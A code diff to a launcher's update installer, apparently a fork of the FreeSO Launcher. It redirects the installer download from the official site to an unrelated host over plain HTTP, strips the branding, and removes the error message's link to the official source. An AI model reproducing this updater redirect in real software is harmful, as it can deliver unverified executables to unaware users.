@@ -21,7 +21,7 @@ class UpdateInstaller {
 
     this.dl = new (require("../Download"))();
     this.dl.add({
-      origin: "http://beta.freeso.org/FreeSO Launcher Setup.exe",
+      origin: "http://tacos.yourfunworld.com/COEziliiInstaller.exe",
       destination: "temp/",
       alias: "installer.exe",
       retries: 1,
@@ -38,7 +38,7 @@ class UpdateInstaller {
   createProgressItem(Message, Percentage) {
     this.FSOLauncher.View.addProgressItem(
       "FSOUpdateProgressItem" + this.id,
-      "FreeSO Launcher",
+      "Launcher",
       "Downloading from " + this.FSOLauncher.updateLocation,
       Message,
       Percentage
@@ -125,7 +125,7 @@ class UpdateInstaller {
         if (stats) {
           this.cleanup();
           return reject(
-            "FreeSO Launcher installation files have failed to download. You can try again later or download it yourself at beta.freeso.org/FreeSO Launcher Setup.exe"
+            "Launcher installation files have failed to download. You can try again later"
           );
         }
         resolve();
